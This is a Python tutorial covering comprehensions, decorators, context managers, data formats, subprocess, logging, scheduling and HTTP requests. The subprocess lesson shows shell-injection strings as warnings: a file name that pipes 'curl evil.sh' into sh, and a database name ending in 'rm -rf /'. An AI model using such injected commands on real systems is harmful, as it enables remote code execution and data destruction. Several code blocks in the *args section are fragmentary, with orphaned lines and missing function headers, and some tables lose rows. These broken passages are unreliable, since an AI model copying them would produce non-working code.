📘 Comprehensions: lists, dicts, sets and generators

A comprehension builds a collection in one expression: what each result looks like, where the items come from, and an optional filter. There are four shapes and they share one grammar, so once you can read one you can read them all.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Half of all data code is "turn this collection into that one". A comprehension says it in a line the reader can check at a glance, and the generator form does the same job without holding every value in memory at once.

The four shapes

squares = [x * x for x in range(10)]             # list
lengths = {name: len(name) for name in names}    # dict: key: value
uniq = {ch for ch in "mississippi"}              # set: duplicates vanish
total = sum(x * x for x in nums)                 # generator: no list is ever built

Read every comprehension the same way. The expression on the left is one result; for names each item; an if at the end keeps only the items that pass. [x for x in nums if x % 2 == 0] keeps the even numbers and nothing else.

Nesting and flattening

flat = [x for row in lol for x in row]        # [[1, 2], [3, 4]] -> [1, 2, 3, 4]

Two for clauses read left to right exactly like nested loops: the outer loop comes first. That is the same order you would write by hand, which is the only reliable way to remember it.

Lists are eager, generators are lazy

A list comprehension materialises every element before you touch the first one. A generator expression yields one value at a time, so sum(...), max(...), any(...) and all(...) over millions of items use almost no memory. any(x < 0 for x in nums) also stops at the first negative number, because it never needs the rest. Inside a call the parentheses of the generator are the call's own.

ShapeBracketsProducesReach for it when

dict{ k: v ... }a mappingbuilding lookups from a list of things
set{ ... }unique values, no orderde-duplicating, membership tests

⚠️ COMMON MISTAKE
Stacking three for clauses and two conditions into one comprehension. If it needs a second read, write the loop. And never use a comprehension for side effects: [print(x) for x in xs] builds a list of None that nobody wanted.
🎯 EXAM TIP
The drills use exactly these forms: evens with [x for x in nums if x % 2 == 0], name lengths with {name: len(name) for name in names}, a generator inside sum() when the prompt says memory matters, and any(...) / all(...) with a bare generator and no extra parentheses.
◇ KEY TAKEAWAYS
  • One grammar: result expression, for item, optional if filter.
  • Brackets pick the type: list, dict, set; parentheses make a lazy generator.
  • Nested for clauses run outer to inner, left to right.
  • Generators feed sum/any/all with constant memory; lists cost memory for every element.

📘 *args, **kwargs and unpacking

A star in a function signature collects arguments; a star at a call site spreads them. The two are mirror images, and together they are how wrappers, decorators, config merging and "call this function with whatever the data says" all work.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

You will read def wrapper(*args, **kwargs) in every decorator, every framework and most libraries. Being fluent in it means you can pass calls through untouched, build flexible signatures, and merge settings without loops.

Collecting: the signature side

def f(a, *args, key=None, **kwargs):
    ...
# a       -> a normal positional parameter
# *args   -> extra positional arguments, as a TUPLE
# key     -> keyword-only, because it comes after *args
# **kwargs -> extra keyword arguments, as a DICT

The order in a signature is fixed: positional parameters, then *args, then keyword-only parameters, then **kwargs. A bare * with no name makes everything after it keyword-only without collecting anything; a / makes everything before it positional-only.

Spreading: the call side

add(*[1, 2, 3])                     # add(1, 2, 3)
show(**{"a": 1, "b": 2})            # show(a=1, b=2)
merged = {**defaults, **overrides}  # later keys win
first, *rest = [1, 2, 3, 4]         # 1 and [2, 3, 4]

Spreading is also how a wrapper passes everything through: def wrapper(*args, **kwargs): return real_fn(*args, **kwargs) forwards any call unchanged, which is the backbone of decorators.

SyntaxWhereMeaning
*argssignaturecollect extra positionals into a tuple
**kwargssignaturecollect extra keywords into a dict
*signatureeverything after it is keyword-only
/signatureeverything before it is positional-only

f(**mapping)callspread a dict into keyword arguments

def total(*nums):
    return sum(nums)

    return args, kwargs

def greet(name, *, formal=False):

try:
    greet("Natasha", True)
except TypeError as e:
    print("TypeError:", e)

    items.append(item)
    return items

    items.append(item)

The last four lines are the mutable-default trap: the [] in items=[] is created once when the def runs, so the second call returns the same list with both items in it. The None sentinel version creates a fresh list on every call.

Common use: wrappers that pass everything through — def wrapper(*args, **kwargs): return real_fn(*args, **kwargs) — the backbone of decorators.

Signature fine print: the mutable-default trap — in def f(items=[]) that [] is created ONCE and shared across calls; use items=None then items = items or []. Positional-only parameters: def divide(a, b, /) — the / makes a and b positional-only. Building URLs: def make_url(base, **params) collects query parameters as a dict to encode.

⚠️ COMMON MISTAKE
A mutable default: def f(items=[]). Defaults are evaluated once, at definition time, and then shared by every call. Use items=None and create the list inside the function.
🎯 EXAM TIP
Know the three exercise signatures cold: def total(*nums), def make_url(base, **params) (then urlencode(params)), and def greet(name, *, formal=False) for keyword-only. Positional-only is def divide(a, b, /). Merging two dicts is {**a, **b}, and the right-hand dict wins on duplicate keys.
◇ KEY TAKEAWAYS
  • *args is a tuple of extra positionals, **kwargs a dict of extra keywords; order is positional, *args, keyword-only, **kwargs.
  • At a call, * spreads a sequence and ** spreads a mapping.
  • {**defaults, **overrides} merges with the later dict winning.
  • Never use a mutable default; use None and build inside.

📘 Decorators, practically

A decorator is a function that takes a function and returns a replacement. The @ line is only sugar: @timer above def work(): means exactly work = timer(work). Everything else about decorators follows from that one substitution.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Timing, logging, retrying, caching and permission checks are the same few lines wrapped around many different functions. A decorator writes them once and applies them with one line, and you will meet them in every framework: @app.route, @pytest.fixture, @dataclass.

The standard shape

import functools

def timer(func):
    @functools.wraps(func)                 # keep func's name and docstring
    def wrapper(*args, **kwargs):
        ...                                # before
        result = func(*args, **kwargs)     # the real call, passed through
        ...                                # after
        return result                      # do not swallow the result
    return wrapper                         # the replacement

Three things must be there: the wrapper accepts *args, **kwargs so it fits any function, it returns the real function's result, and the outer function returns the wrapper. functools.wraps copies the original's __name__ and __doc__ onto the wrapper so tracebacks, help and test reports still say greet instead of wrapper.

Decorators with arguments

def repeat(n):                  # a factory: returns a decorator
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            for _ in range(n):
                result = func(*args, **kwargs)
            return result
        return wrapper
    return decorator

@repeat(3)
def ping(): print("ping")

@repeat(3) calls repeat(3) first, gets a decorator back, and applies that. One extra layer, same idea.

DecoratorFromWhat it does

@staticmethod / @classmethodbuilt ina method without self / one that receives the class as cls
@functools.lru_cache, @functools.cachefunctoolsmemoise a pure function; repeated inputs return instantly

▸ WORKED EXAMPLE — stacking two decorators, and a cache that turns an exponential function into a lookup
import functools, time

def timing(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        start = time.perf_counter()
        result = func(*args, **kwargs)
        print(f"{func.__name__} took {time.perf_counter() - start:.4f}s")
        return result
    return wrapper

def shout(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs).upper()
    return wrapper

@timing
@shout
def greet(name):
    """Say hello."""
    return f"hello, {name}"

print(greet("natasha"))
print(greet.__name__, "-", greet.__doc__)

@functools.lru_cache(maxsize=None)
def fib(n):
    return n if n < 2 else fib(n - 1) + fib(n - 2)

print(fib(80))
print(fib.cache_info())
greet took 0.0000s HELLO, NATASHA greet - Say hello. 23416728348467685 CacheInfo(hits=78, misses=81, maxsize=None, currsize=81)
actual output, captured from Python 3.11

Walk through it: @timing sits above @shout, so greet = timing(shout(greet)): the decorator nearest the def is applied first, and the timing wrapper is the outermost thing that runs. Because both use functools.wraps, the finished function still reports its name and docstring. fib(80) would take longer than the age of the universe without a cache; with lru_cache every value is computed once, and cache_info() shows 81 misses (one per distinct n) against 78 hits.

Exercise forms the drills use

Two exercise patterns: a computed attribute — in class Circle, @property def area(self): return 3.14159 * self.r ** 2 lets you write circle.area with no parentheses. And the minimal decorator: def log_call(f): def wrapper(*a, **kw): print("calling f"); return f(*a, **kw); return wrapper — prints before delegating.

⚠️ COMMON MISTAKE
Forgetting return somewhere. Either the wrapper does not return func(...), so every decorated function silently returns None, or the decorator does not return the wrapper, so the decorated name becomes None and the next call raises "NoneType is not callable".
🎯 EXAM TIP
Exercise forms: def log_call(f): def wrapper(*a, **kw): print("calling f"); return f(*a, **kw); return wrapper; a computed attribute with @property def area(self): return 3.14159 * self.radius ** 2; and the three-layer repeat(n) skeleton. When decorators stack, the one closest to def is applied first.
◇ KEY TAKEAWAYS
  • @deco above def f is exactly f = deco(f).
  • Shape: outer takes func, inner wrapper(*args, **kwargs) calls it and returns its result, outer returns the wrapper.
  • Always @functools.wraps(func) on the wrapper.
  • A decorator with arguments is a factory that returns a decorator; lru_cache and property are decorators you already use.

📘 Context managers and the with statement

with open("data.txt") as f: promises one thing: whatever happens inside the block, the file is closed when the block ends. A context manager is any object that makes that kind of promise: set something up on entry, guarantee the cleanup on exit.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Files, locks, database transactions, temporary folders and network connections all leak when an exception skips the cleanup line. A with block cannot skip it. Reading and writing files is also the single most common drill in this course, and every one of them wants with.

The protocol: __enter__ and __exit__

class Timer:
    def __enter__(self):
        self.start = time.perf_counter()
        return self                                  # bound to the "as" name
    def __exit__(self, exc_type, exc, tb):
        print(f"{time.perf_counter() - self.start:.3f}s")
        return False                                 # False: let any exception propagate

__exit__ always runs, and receives the exception (or three Nones) so it can decide whether to swallow it. Returning False (or nothing) re-raises, which is almost always what you want.

The shortcut: @contextmanager

from contextlib import contextmanager

@contextmanager
def timer(label):
    start = time.perf_counter()          # setup
    try:
        yield                            # the with-block runs here
    finally:
        print(f"{label}: {time.perf_counter() - start:.3f}s")   # cleanup, guaranteed

Everything before yield is entry, everything after is exit, and try/finally makes the exit run even when the block raises. Yield a value to bind it with as.

ManagerOn entryOn exit
open(path, mode)opens the filecloses it, even after an exception
open(a) as f, open(b, "w") as gtwo managers in one lineclosed in reverse order
sqlite3.connect(...)nothing extracommits on success, rolls back on exception; the connection stays open
contextlib.suppress(FileNotFoundError)nothingswallows only that exception type
tempfile.TemporaryDirectory()creates a folderdeletes it and everything inside
threading.Lock()acquires the lockreleases it, so a crash cannot deadlock others
▸ WORKED EXAMPLE — cleanup that survives an exception
import time, sqlite3
from contextlib import contextmanager, suppress
from pathlib import Path

@contextmanager
def timer(label):
    start = time.perf_counter()
    try:
        yield
    finally:
        print(f"{label}: {time.perf_counter() - start:.3f}s")

with timer("sleep"):
    time.sleep(0.05)

# the file is closed when the block ends, even when an exception escapes it
try:
    with open("notes.txt", "w") as f:
        f.write("first line\n")
        raise ValueError("something went wrong mid-write")
except ValueError as e:
    print("caught:", e)
print("closed?", f.closed, "| contents:", Path("notes.txt").read_text().strip())

with suppress(FileNotFoundError):
    Path("does-not-exist.txt").unlink()
print("no error from a missing file")

with sqlite3.connect(":memory:") as conn:
    conn.execute("CREATE TABLE t (x)")
    conn.execute("INSERT INTO t VALUES (1)")
print(conn.execute("SELECT COUNT(*) FROM t").fetchone())   # committed - and the connection is still open
sleep: 0.050s caught: something went wrong mid-write closed? True | contents: first line no error from a missing file (1,)
actual output, captured from Python 3.11

Walk through it: the generator-based timer prints its elapsed time when the block ends. The open block raises halfway through writing, and the except outside the with catches it; afterwards f.closed is True and the first line was flushed to disk, which is the whole guarantee. suppress turns a missing file into a no-op. The sqlite block committed the insert (the count is 1 afterwards) but note the connection is still usable: the sqlite manager handles the transaction, not the connection.

Exercise forms the drills use

Exercise forms: writing — with open("log.txt", "w") as f: f.write(line) (mode w truncates, a appends). Ignoring an expected error: with contextlib.suppress(FileNotFoundError): Path("tmp").unlink(). Databases too: with sqlite3.connect("app.db") as conn: — the with-block commits the transaction on success.

Exact exercise form: sqlite3 in a with-statement — with sqlite3.connect("app.db") as conn: conn.execute(...) — commits on success, rolls back on exception.

⚠️ COMMON MISTAKE
Assuming with sqlite3.connect(...) as conn: closes the connection. It only commits or rolls back. Call conn.close() yourself, or wrap it in contextlib.closing(...) when the connection must not outlive the block.
🎯 EXAM TIP
Know the __exit__(self, exc_type, exc, tb) signature, that @contextmanager splits a generator at its yield, that with open(a) as f, open(b, "w") as g: opens two, and that mode "w" truncates while "a" appends. Pass encoding="utf-8" explicitly when the file is text you did not write.
◇ KEY TAKEAWAYS
  • with guarantees cleanup on exit, including when the block raises.
  • Protocol: __enter__ returns the as value, __exit__ always runs and sees the exception.
  • @contextmanager on a generator: setup, yield, cleanup in finally.
  • Files close, locks release, transactions commit or roll back; sqlite does not close.

📘 CSV, JSON, YAML and TOML

Four text formats carry most of the data and configuration a script will ever touch. Each has a standard-library or near-standard module, and each has one habit that trips people up.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Exports arrive as CSV, APIs speak JSON, pipelines and workflows are configured in YAML, and every modern Python project is described by a TOML file. Reading and writing all four correctly is table stakes for automation work.

CSV: rows of strings

with open("out.csv", "w", newline="") as f:
    w = csv.DictWriter(f, fieldnames=["id", "name"])
    w.writeheader()
    w.writerows(rows)

with open("out.csv", newline="") as f:
    rows = list(csv.DictReader(f))      # each row a dict keyed by the header

Open CSV files with newline="" as the documentation asks, so the module controls line endings. DictReader gives one dict per row; csv.reader gives lists. Every value comes back as a string, so numbers and dates need converting, or you hand the file to pd.read_csv which does that for you.

JSON: the language of APIs

data = json.load(f)                      # from a file object
obj = json.loads(text)                   # from a string
json.dump(data, f, indent=2)             # to a file, pretty-printed
records = [json.loads(line) for line in f]   # JSON Lines: one object per line

JSON has no comments, no trailing commas and only double quotes; null becomes None, true becomes True. The s in loads/dumps means string.

YAML and TOML: configuration

cfg = yaml.safe_load(open("config.yml"))       # always safe_load
with open("pyproject.toml", "rb") as f:        # tomllib wants binary mode
    project = tomllib.load(f)

YAML allows comments and nesting by indentation, which is why CI and workflow tools use it. Use yaml.safe_load every time: plain load can construct arbitrary Python objects from a hostile file. TOML is the format of pyproject.toml; tomllib (Python 3.11+) reads it and is read-only, which is fine because you edit those files by hand.

JSONjsonload / loadsdump / dumpsAPIs, data exchangeno comments, no trailing commas

📘 pathlib: paths as objects

from pathlib import Path replaces string mashing with objects that know they are paths. Joining is the / operator, the parts have names, and reading, writing, checking and searching are methods on the path itself.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Scripts that build paths with string concatenation break the moment they meet Windows, a trailing slash, or a file name with a dot in it. pathlib is portable, readable and shorter, and it is what every modern library expects to be handed.

Building and taking apart

p = Path("data") / "raw" / "sales_2026.csv"
p.name      # 'sales_2026.csv'
p.stem      # 'sales_2026'
p.suffix    # '.csv'
p.parent    # Path('data/raw')
p.with_suffix(".parquet")       # same place, new extension
Path.cwd(), Path.home(), p.resolve()   # anchors and the absolute form

Reading, writing, checking

text = p.read_text()                     # whole file as a string
p.write_text("hello")                    # create or overwrite
p.exists(), p.is_file(), p.is_dir()
p.parent.mkdir(parents=True, exist_ok=True)   # make every missing folder, no error if present
p.unlink()                               # delete the file

Finding files

list(Path(".").glob("*.csv"))       # this folder only
list(Path(".").rglob("*.py"))       # recurse into every subfolder

📘 Parquet, Arrow and modern data files

CSV stores a table row by row as text. Parquet stores it column by column, compressed and typed, with statistics that let a reader skip whole blocks. The difference is not cosmetic: it is the difference between a file that is a snapshot of text and a file that is a database engine's best friend.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Analytics work reads a few columns from many rows, over and over. Parquet makes those reads several times smaller and faster, keeps dates as dates and numbers as numbers, and is what every warehouse, lakehouse and DataFrame library exchanges natively.

Row files versus column files

A CSV reader must scan every byte of every row even if you want one column. A Parquet file holds each column together, compresses it (integers and repeated strings compress extremely well), records min/max per block, and can hand back only the columns requested. Types travel with the data, so nothing is re-parsed on load.

The pandas calls

df.to_parquet("out.parquet", index=False)                  # dtypes preserved, snappy-compressed
df = pd.read_parquet("out.parquet")
df = pd.read_parquet("out.parquet", columns=["id", "amount"])   # read only what you need
df.to_parquet("out_dir", partition_cols=["year"])             # one folder per year; engines skip the rest
pq.read_schema("out.parquet")                                 # pyarrow: inspect without loading
pq.read_table("out.parquet").to_pandas()                      # pyarrow Table -> DataFrame

Arrow: the format in memory

Apache Arrow is the in-memory columnar layout that pandas, Polars, DuckDB, Spark and pyarrow share, so a table can be passed between them without copying or re-encoding. Parquet is the on-disk format that pairs with it. Feather is Arrow's own layout written straight to disk: fastest to load, larger than Parquet, best for scratch files between steps of one pipeline rather than long-term storage.

📘 Compression and streaming large files

Two habits let a laptop process files far bigger than its memory: open compressed files directly instead of unpacking them, and read in a stream (lines or chunks) instead of loading everything at once.

🎯 WHY THIS MATTERS

Log exports and data dumps arrive gzipped and run to gigabytes. A script that calls f.read() on one of them dies with a memory error; the same script written as a loop over lines runs on anything.

Compressed files open like plain files

import gzip, zipfile
with gzip.open("log.txt.gz", "rt") as f:        # "rt": read text, decompress on the fly
    for line in f: ...
with gzip.open("out.csv.gz", "wt") as f:        # "wt": write text, compress on the fly
    f.write("id,amount\n")
with zipfile.ZipFile("archive.zip") as z, z.open("inside.csv") as f: ...
df = pd.read_csv("data.csv.gz")                 # pandas infers compression from the extension
df.to_csv("out.csv.gz", index=False)            # and compresses on the way out

Modes matter: "rt"/"wt" give you strings, the default "rb"/"wb" give bytes. tarfile handles .tar.gz the same way.

Stream, never hold

with open("huge.txt") as f:
    for line in f:                              # one line in memory at a time
        ...
for chunk in pd.read_csv("big.csv", chunksize=100_000):   # DataFrames of 100k rows
    total += chunk["amount"].sum()
from itertools import islice
head = list(islice(f, 100))                     # the first 100 lines, nothing more read

A file object is already an iterator of lines. chunksize turns read_csv into an iterator of DataFrames, so any aggregation becomes a running total. For random access into a big binary file, mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) maps it into memory pages that load on demand.

📘 argparse: real command-line scripts

argparse turns a script into a tool with named options, type checking, defaults and a --help page, all generated from a few add_argument calls. It is the difference between "edit the constants at the top of the file" and something a teammate can run.

🎯 WHY THIS MATTERS

Every automation you hand over will be run with different inputs by someone who did not write it. A parser gives them help text, validates what they typed before your code runs, and lets the same script serve several jobs through subcommands.

The skeleton of a professional script

import argparse

def main():
    parser = argparse.ArgumentParser(description="Build the weekly report")
    parser.add_argument("filename", help="path to the export")             # positional, required
    parser.add_argument("--limit", type=int, default=10)                    # option with a type and default
    parser.add_argument("--verbose", action="store_true")                   # boolean flag
    parser.add_argument("--mode", choices=["read", "write"], default="read")
    parser.add_argument("--files", nargs="+")                               # one or more values
    args = parser.parse_args()
    print(args.filename, args.limit, args.verbose)

if __name__ == "__main__":
    main()

The __main__ guard means the file can be imported (for tests) without running. parse_args() reads sys.argv by default; pass a list to test the parser in code.

Subcommands

sub = parser.add_subparsers(dest="command", required=True)
s = sub.add_parser("sync");    s.add_argument("--since")
r = sub.add_parser("report");  r.add_argument("week", type=int)
args = parser.parse_args()
if args.command == "sync": ...

dest="command" records which subcommand ran; required=True turns a missing one into a usage error instead of a silent None.

    print("exit code", e.code)

📘 subprocess: running external commands

Python scripts rarely live alone. They call git, run a database dump, convert a file with ffmpeg, or launch another script. The subprocess module is the standard way to start another program, wait for it, and read what it printed - and the modern entry point is one function: subprocess.run().

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Almost every automation you will write orchestrates other tools. Doing it safely (no shell injection), reliably (check exit codes, set timeouts) and readably (capture text, not bytes) is the difference between a script that runs unattended for a year and one that silently does nothing.

The modern call

import subprocess

result = subprocess.run(["git", "status", "--short"], capture_output=True, text=True)
print(result.returncode)   # 0 means success
print(result.stdout)       # what the command printed
print(result.stderr)       # its error output, if any
  • Pass the command as a list - ["git", "status"] - one element per argument. No shell parses it, so a file name with spaces or a ; in user input cannot turn into a second command.
  • capture_output=True collects stdout and stderr instead of letting them spill onto your terminal.
  • text=True decodes them to str; without it you get bytes.
  • check=True raises CalledProcessError when the exit code is not 0, so a failed command cannot be silently ignored.
  • timeout= (seconds) kills a command that hangs and raises TimeoutExpired.

The options that matter, side by side

OptionDefaultSet it when…
args as a list-always; a string is only for shell=True
capture_output=TrueFalseyou need to read what the program printed
text=TrueFalse (bytes)the output is text - nearly always
check=TrueFalsea failure should stop your script with an exception
timeout=Nnonethe program might hang (network tools, interactive prompts)
cwd="path"current dirthe command must run inside another folder (a repo)
env=dict(os.environ, X="1")inheritthe child needs an extra variable - copy the parent's, then add
shell=TrueFalseyou genuinely need pipes, globs or redirects - and the input is trusted
▸ WORKED EXAMPLE — a backup step that cannot fail silently
import subprocess, sys

try:
    r = subprocess.run(
        ["pg_dump", "--file", "backup.sql", "studyhub"],
        capture_output=True, text=True, check=True, timeout=600,
    )
except subprocess.CalledProcessError as e:
    print("dump failed:", e.returncode, e.stderr.strip())
    sys.exit(1)
except subprocess.TimeoutExpired:
    print("dump took longer than 10 minutes - aborted")
    sys.exit(1)
print("backup written")

Walk through it: the command is a list, so a database named study; rm -rf / would be passed to pg_dump as one odd name, never run as a second command. check=True turns a non-zero exit into an exception you handle explicitly. timeout=600 means a stuck connection ends the script with a clear message instead of hanging forever. The script's own exit code (1) tells the scheduler it failed.

Passing environment variables

import os, subprocess
r = subprocess.run(["printenv", "X"], env=dict(os.environ, X="hello"), capture_output=True, text=True)
print(r.stdout.strip())   # hello

env= replaces the child's environment, so start from a copy of os.environ and add to it - passing {"X": "hello"} alone would strip PATH and the command would not even be found.

⚠️ COMMON MISTAKE
Building a command string and using shell=True because "it worked in the terminal": subprocess.run(f"convert {name} out.png", shell=True). A file named a.png; curl evil.sh | sh now runs the attacker's command. Use the list form; if you must use the shell, quote with shlex.quote().
🎯 EXAM TIP
Three things to name whenever subprocess.run comes up: list form (safety), check=True (failures raise), returncode 0 = success. Older functions - call, check_output, Popen - still exist; run() covers nearly every case since Python 3.5.
◇ KEY TAKEAWAYS
  • subprocess.run([...], capture_output=True, text=True) is the modern call; read returncode, stdout, stderr.
  • List form avoids shell injection; shell=True only with trusted input.
  • check=True raises on failure; timeout= prevents hangs.
  • env=dict(os.environ, KEY=value) adds a variable without losing the rest.

📘 Logging done right

print() is fine while you are watching. The moment a script runs unattended - on a schedule, on a server, on someone else's machine - you need to know when something happened, how serious it was, which module said it, and you need to be able to turn the chatter down without editing code. That is what the logging module gives you, and it is in the standard library.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Every automation you hand to a team will fail one day at 3 a.m. A log with timestamps, levels and the traceback is the difference between fixing it in five minutes and guessing for an afternoon.

The minimum setup

import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger(__name__)     # one per module, named after it

logger.info("sync started")
logger.warning("3 items skipped - missing owner")
logger.error("could not reach SharePoint")

basicConfig is called once, in the program's entry point. Every other module just does getLogger(__name__); the names build a tree (drafter.rules, drafter.model) so you can later turn one module up to DEBUG on its own.

The five levels

LevelUse it forExample
DEBUGdiagnostic detail you only want while investigating"parsed 412 rows in 0.3s"
INFOnormal operation, the milestones"report written to reports/2026-09-07.xlsx"
WARNINGsurprising but handled; someone should glance at it"holiday file missing - using national calendar only"
ERRORan operation failed; the program continues"email to lead failed: connection refused"
CRITICALthe program cannot continue"export.xlsx not found - nothing to report"

The configured level is a threshold: at INFO, DEBUG messages are dropped and everything from INFO up is kept. Production default is INFO; flip to DEBUG when investigating - by changing one line, or an environment variable, not by adding prints.

▸ WORKED EXAMPLE — a failure you can actually diagnose
def sync_item(ref):
    try:
        push(ref)
        logger.info("synced %s", ref)
    except ConnectionError:
        logger.exception("failed to sync %s", ref)   # level ERROR + the full traceback
        return False
    return True

Walk through it: logger.exception() is logger.error() plus the traceback, and it is only valid inside an except block. The log line reads 2026-09-07 08:31:02 ERROR drafter.sync: failed to sync CR-2026-0413 followed by the stack - the reference, the time, the module and the cause, with nothing typed by hand. Note the %s placeholder with ref as an argument: the string is only built if the level is enabled, so a DEBUG line that formats a huge object costs nothing in production. An f-string would pay that cost every time.

Rotating files so logs never fill the disk

from logging.handlers import RotatingFileHandler

handler = RotatingFileHandler("app.log", maxBytes=1_000_000, backupCount=3)
handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s"))
logging.getLogger().addHandler(handler)        # the root logger: every module's messages

When app.log reaches 1 MB it is renamed app.log.1 and a fresh file starts; three backups are kept and the oldest is deleted. TimedRotatingFileHandler does the same by day or hour.

  • Levels are thresholds: DEBUG, INFO, WARNING, ERROR, CRITICAL - production runs at INFO.
  • logger.exception() inside except records the traceback.

📘 Scheduling: cron, GitHub Actions, Airflow and friends

A script that runs by itself at 02:30 every night is worth ten that need a human to remember. The ladder of tools goes from a cron line, to a workflow file that runs in the cloud, to an orchestrator that understands dependencies. Use the lowest rung that meets the need.

🎯 WHY THIS MATTERS

Correspondence-team automations (exports, reports, reminders) are scheduled jobs by nature. Knowing the five cron fields, what a GitHub Actions schedule promises, and when plain scheduling stops being enough is what makes an automation dependable rather than a demo.

cron: five fields

# minute  hour  day-of-month  month  day-of-week   command
  30      2     *             *      *             /usr/bin/python3 /home/me/job.py
LineRuns
0 2 * * *every day at 02:00
30 2 * * *every day at 02:30
0 9 * * 1Mondays at 09:00 (0 or 7 is Sunday)
*/15 * * * *every 15 minutes
0 7 1 * *the first of each month at 07:00

Edit with crontab -e, use absolute paths for both the interpreter and the script, and remember cron runs in the server's timezone with a minimal environment. Windows has Task Scheduler for the same job.

GitHub Actions: cron in the cloud

on:
  schedule:
    - cron: "0 7 * * *"        # UTC, at most every 5 minutes, may start late
  workflow_dispatch:           # a Run button in the GitHub UI
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: {python-version: "3.11"}
      - run: pip install -r requirements.txt
      - run: python report.py

No server to maintain, logs kept per run, secrets stored in the repository settings. Schedules are UTC only and are not guaranteed to fire on the minute.

When cron is not enough

The moment jobs depend on each other (load, then transform, then report) cron becomes a pile of guesses about timing. Airflow, Prefect and Dagster define a pipeline as a DAG of tasks with retries, backfills and a UI showing what ran. Inside one long-running process, APScheduler (sched.add_job(job, "interval", minutes=5)) or the schedule library (schedule.every().day.at("10:30").do(task)) do the timing. And whichever tool starts the job, make sure only one copy runs at a time: a file lock (filelock, or fcntl.flock on Linux) turns a double start into a clean skip.

APScheduler / scheduleinside your Python processa service that is already running needs a timer
Airflow / Prefect / Dagstera scheduler servicejobs depend on each other, need retries, backfills and a UI

📘 The requests library

requests is how Python talks to HTTP APIs: one function per method, keyword arguments for the query string, headers and body, and a response object that knows its status and can parse JSON. Almost every integration script is a thin layer over these calls.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Pulling data from a service, posting a record, downloading a report: each is one requests call done properly, or a subtle bug done casually. The four habits in this lesson (timeouts, raise_for_status, json=, sessions) are what separate the two.

One call, four things to read

r = requests.get(url, params={"q": "python", "limit": 10}, timeout=10)
r.status_code      # 200, 404, 500 ...
r.ok               # True for anything below 400
r.headers          # a case-insensitive dict
r.json()           # the body parsed as JSON (r.text for the raw string)

params becomes the query string, correctly encoded, so you never build ?q=...&limit=... by hand.

Sending data

requests.post(url, json={"name": "Alice"}, timeout=10)   # serialises and sets Content-Type: application/json
requests.post(url, data={"name": "Alice"})                # form-encoded body instead
requests.get(url, headers={"Accept": "application/json", "X-Token": "abc"})
requests.delete(url + "/users/42", timeout=10)

Timeouts, errors, sessions

Always pass timeout=: without it a dead server hangs your script forever, and a scheduled job that hangs is worse than one that fails. r.raise_for_status() turns any 4xx or 5xx into an HTTPError so failures cannot be ignored. For many calls to one host, requests.Session() reuses the connection, keeps cookies and carries shared headers; large downloads use stream=True with iter_lines() or iter_content() so the body is never held whole.

MethodCallTypical use
GETrequests.get(url, params=..., timeout=10)read; parameters in the query string
POSTrequests.post(url, json=payload)create; JSON body
PUT / PATCHrequests.put(url, json=payload)replace / partially update
DELETErequests.delete(url)remove
any, repeatedlys = requests.Session(); s.get(...)connection reuse, shared headers and cookies
large bodyrequests.get(url, stream=True) then for line in r.iter_lines()streams instead of loading

import json, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import requests

class Handler(BaseHTTPRequestHandler):          # a 20-line stand-in for a real API
    def do_GET(self):
        url = urlparse(self.path)
        if url.path == "/users":
            self._send(200, {"query": parse_qs(url.query), "users": [{"id": 1, "name": "Ann"}]})
        else:
            self._send(404, {"error": "not found"})
    def do_POST(self):
        payload = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        self._send(201, {"created": payload, "content_type": self.headers["Content-Type"]})
    def _send(self, status, obj):
        data = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self, *a):
        pass

server = HTTPServer(("127.0.0.1", 0), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()
base = f"http://127.0.0.1:{server.server_port}"

r = requests.get(base + "/users", params={"q": "python", "limit": 10}, timeout=5)
print(r.status_code, r.url.replace(base, ""))
print(r.json())
r = requests.post(base + "/users", json={"name": "Alice"}, timeout=5)
print(r.status_code, r.json())
r = requests.get(base + "/nope", timeout=5)
print(r.status_code, r.ok)
try:
    r.raise_for_status()
except requests.HTTPError as e:
    print("HTTPError:", e)
server.shutdown()

The POST returned 201 and shows that json= set Content-Type: application/json by itself. The bad path returned 404 with r.ok False; nothing was raised until raise_for_status(), which produced an HTTPError naming the status and the URL.

Exercise calls: with headers — requests.get(url, headers={"Accept": "application/json"}); with a 5-second timeout — requests.get(url, timeout=5); fail loudly on any status >= 400 — r.raise_for_status() right after the call.

No timeout, and checking only r.status_code == 200. A successful create is 201 and a successful delete is often 204; test r.ok or call raise_for_status(). Calling r.json() on an HTML error page raises a decode error, so check the status first.

◇ KEY TAKEAWAYS

  • Read status_code, ok, headers, json(); call raise_for_status() to fail loudly.
  • Always timeout=; a Session for repeated calls to one host.
  • stream=True with iter_lines for big responses.

📘 API authentication: headers, tokens and keys

Most APIs authenticate a script with a token sent in a header on every request. The two questions are where the token goes on the wire and where it lives on your machine, and the second one is where people get hurt.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

A key pasted into a script and pushed to GitHub is in the history forever, and bots scan for exactly that within minutes. Handling secrets properly is a habit you build once and keep for every project.

Where the token goes

headers = {"Authorization": f"Bearer {token}"}      # the most common scheme
